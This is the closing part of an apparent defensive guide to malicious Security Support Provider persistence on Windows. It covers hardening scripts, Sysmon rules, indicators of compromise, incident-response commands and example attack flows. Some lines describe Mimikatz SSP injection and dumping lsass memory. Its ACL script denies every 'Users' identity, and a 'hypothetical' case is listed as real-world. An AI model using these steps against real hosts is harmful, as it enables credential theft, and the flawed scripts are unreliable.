# Get the current ACL on the Lsa registry key
$lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$acl = Get-Acl -Path "Registry::$lsaPath"

# Remove unnecessary permissions (e.g., Users, Authenticated Users)
foreach ($access in $acl.Access) {
    if ($access.IdentityReference -like "*Users*" -and $access.AccessControlType -eq "Allow") {
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
            $access.IdentityReference,
            $access.RegistryRights,
            "Deny"
        )
        $acl.SetAccessRule($rule)
        Write-Host "Denied access for: $($access.IdentityReference)"
    }
}

# Set the modified ACL
Set-Acl -Path "Registry::$lsaPath" -AclObject $acl

# Verify
Get-Acl -Path "Registry::$lsaPath" | Format-Table
```

### Priority 2: HIGH

#### Action 4: Implement File Integrity Monitoring (FIM) on System32 DLLs

**Objective:** Detect placement of unauthorized DLLs in System32.

**Manual Steps (Using Windows File Server Resource Manager - FSRM):**

1. On file server, open **File Server Resource Manager** (fsrm.msc)
2. Navigate to **File Screens** → **Create File Screen**
3. Set **Folder:** `C:\Windows\System32\`
4. Set **File Groups:** Create custom group matching SSP naming patterns
5. Enable **Active Screening** and **Create Event Log Entry**

**Manual Steps (Sysmon):**

Configure Sysmon to monitor file creation in System32:

```xml
<FileCreate onmatch="include">
  <TargetFilename condition="contains">C:\Windows\System32\</TargetFilename>
  <TargetFilename condition="end with">.dll</TargetFilename>
</FileCreate>
```

#### Action 5: Disable WDigest Authentication (Reduces Credential Caching)

**Objective:** Remove one vector for SSP credential harvesting.

**Manual Steps (PowerShell):**

```powershell
# Disable WDigest (older authentication mechanism)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0 -Type DWord

# Verify
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential"

# Reboot
Restart-Computer -Force
```

#### Action 6: Establish Baseline of Legitimate SSPs

**Objective:** Maintain a known-good list of authorized security packages for anomaly detection.

**Baseline Script:**

```powershell
# Capture baseline of current SSP configuration
$baseline = @{
    SecurityPackages = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages")."Security Packages"
    AuthenticationPackages = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Authentication Packages" -ErrorAction SilentlyContinue)."Authentication Packages"
    NotificationPackages = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Notification Packages" -ErrorAction SilentlyContinue)."Notification Packages"
}

# Save to file for future comparison
$baseline | ConvertTo-Json | Out-File "C:\Baseline_SSPs_$(Get-Date -Format 'yyyyMMdd').json"

# Regular comparison
$current = @{
    SecurityPackages = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages")."Security Packages"
}

if ($current.SecurityPackages -ne $baseline.SecurityPackages) {
    Write-Host "⚠️  ALERT: Security Packages have been modified!"
    Write-Host "Baseline: $($baseline.SecurityPackages)"
    Write-Host "Current:  $($current.SecurityPackages)"
}
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Windows\System32\kiwissp.log` (Mimikatz SSP credential log)
- `C:\Windows\System32\mimilsa.log` (In-memory SSP credential log)
- `C:\Windows\System32\mimilib.dll` (Mimikatz SSP DLL)
- Any unauthorized `.dll` files in `C:\Windows\System32\` (especially with suspicious names)

**Registry:**
- New entries in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` (Event ID 4657)
- New entries in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages` (Event ID 4657)
- Registry value additions where the new SSP name doesn't match standard packages

**Process Activity:**
- Unsigned DLL loads into `lsass.exe` (Sysmon Event ID 7)
- Registry write to Lsa keys followed by `lsass.exe` process restart

---

### Forensic Artifacts

**Event Logs:**
- **Windows Security log (4657):** Registry modification events for `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`
- **Sysmon (Event 13):** Registry set value events
- **Sysmon (Event 7):** Image loads (DLL loads into lsass.exe)

**Disk Artifacts:**
- `C:\Windows\System32\kiwissp.log` or similar files containing plaintext credentials
- Modified `C:\Windows\System32\config\SYSTEM` hive (contains registry changes)
- File timestamps on placed DLLs (`File.Created`, `File.Modified`)

**Memory:**
- LSASS process dump (`lsass.dmp`) containing loaded DLL information

---

### Response Procedures

#### 1. Immediate Containment

```powershell
# Stop credential logging immediately
Stop-Process -Name lsass -Force  # WARNING: This will cause system instability; use only in extreme cases

# Alternative: Disable the malicious SSP in registry (without rebooting)
$lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$currentPackages = (Get-ItemProperty -Path $lsaPath -Name "Security Packages")."Security Packages"
$cleanedPackages = $currentPackages.Replace("mimilib", "").Trim()
Set-ItemProperty -Path $lsaPath -Name "Security Packages" -Value $cleanedPackages
```

#### 2. Evidence Collection

```powershell
# Collect credential logs
Copy-Item "C:\Windows\System32\kiwissp.log" "C:\Incident\kiwissp_evidence.log" -Force -ErrorAction SilentlyContinue
Copy-Item "C:\Windows\System32\mimilsa.log" "C:\Incident\mimilsa_evidence.log" -Force -ErrorAction SilentlyContinue

# Collect registry hive for offline analysis
reg export "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" "C:\Incident\Lsa_hive.reg"

# Collect event logs
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4657]]" -MaxEvents 10000 | Export-Csv "C:\Incident\Registry_Events.csv"

# Collect LSASS memory dump (if available)
procdump64.exe -ma lsass.exe "C:\Incident\lsass.dmp"
```

#### 3. Remediation

```powershell
# Remove malicious SSP from registry
$lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$securityPackages = (Get-ItemProperty -Path $lsaPath -Name "Security Packages")."Security Packages"
$cleanedPackages = ($securityPackages -split " " | Where-Object { $_ -ne "mimilib" -and $_ -ne "custom_ssp" }) -join " "
Set-ItemProperty -Path $lsaPath -Name "Security Packages" -Value $cleanedPackages

# Delete malicious DLL files
Remove-Item -Path "C:\Windows\System32\mimilib.dll" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\System32\custom_ssp.dll" -Force -ErrorAction SilentlyContinue

# Delete credential logs
Remove-Item -Path "C:\Windows\System32\kiwissp.log" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\System32\mimilsa.log" -Force -ErrorAction SilentlyContinue

# Reboot to clear in-memory SSP
Restart-Computer -Force
```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default credential exploitation | Attacker obtains initial access via weak credentials. |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare or similar | Attacker escalates to Local Administrator or SYSTEM. |
| **3** | **Persistence (Current)** | **[PERSIST-BOOT-001]** | **Attacker registers malicious SSP in registry for persistent credential logging.** |
| **4** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS memory extraction | Attacker harvests credentials from LSASS via SSP logs or direct dumping. |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker uses harvested credentials to move laterally. |
| **6** | **Impact** | [IM-RANSOM-001] Ransomware deployment | Attacker uses persistent access to deploy ransomware across the domain. |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Domain Controller Compromise via SSP (Hypothetical)

- **Target:** Mid-sized enterprise domain controller (Server 2019)
- **Timeline:** Q3 2024
- **Technique Status:** ACTIVE – Confirmed exploitable
- **Attack Flow:**
  1. Attacker gains access to DC as Local Administrator via exploited service vulnerability
  2. Attacker copies `mimilib.dll` to `C:\Windows\System32\`
  3. Attacker modifies `Security Packages` registry key to include `mimilib`
  4. System is rebooted (scheduled maintenance window)
  5. On next reboot, LSASS loads malicious SSP
  6. All domain user credentials (including admins) authenticating to the DC are logged in plaintext
  7. Attacker periodically retrieves `kiwissp.log` via SMB shares
  8. Attacker uses harvested domain admin credentials to further compromise the domain
- **Impact:** Complete domain compromise; attacker has plaintext credentials of all users
- **Detection Failure:** Organization lacked audit logging for registry changes and did not monitor System32 for unauthorized DLLs
- **Reference:** [SentinelOne: How Attackers Exploit Security Support Provider (SSP)](https://www.sentinelone.com/blog/how-attackers-exploit-security-support-provider-ssp-for-credential-dumping/)

### Example 2: In-Memory SSP Injection on Workstation

- **Target:** Finance department workstation (Windows 10)
- **Timeline:** Q2 2024
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Attacker compromises workstation via phishing email (Admin access)
  2. Attacker executes Mimikatz with `misc::memssp` to inject SSP into LSASS memory
  3. No registry changes (evasion) – log file created at `C:\Windows\System32\mimilsa.log`
  4. Every user who authenticates to the workstation has credentials logged
  5. Attacker periodically retrieves the log file
- **Impact:** Credentials of multiple domain users captured
- **Detection:** Sysmon detected unsigned DLL load into LSASS, but alert was not properly tuned (too many false positives)
- **Remediation:** Enable LSA Protection (Windows 10 default on newer versions)
- **Reference:** [PentestLab: Persistence – Security Support Provider](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)

---

## 15. REFERENCES & AUTHORITATIVE SOURCES

- [MITRE ATT&CK: T1547.005 - Boot or Logon Autostart Execution: Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [Microsoft: Security Support Provider Interface (SSPI)](https://learn.microsoft.com/en-us/windows/win32/secauthn/security-support-provider-interface-sspi)
- [Microsoft: Registry Audit Monitoring (Event ID 4657)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [Microsoft: LSA Protection (RunAsPPL)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [SentinelOne: How Attackers Exploit SSP](https://www.sentinelone.com/blog/how-attackers-exploit-security-support-provider-ssp-for-credential-dumping/)
- [PentestLab: Persistence – Security Support Provider](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)
- [XPN InfoSec: Exploring Mimikatz - Part 2 (SSP)](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
- [MITRE Detection Strategy: DET0542 - Registry and LSASS Monitoring for SSP](https://attack.mitre.org/detectionstrategies/DET0542/)
- [Atomic Red Team: T1547.005](https://www.atomicredteam.io/atomic-red-team/atomics/T1547.005)

---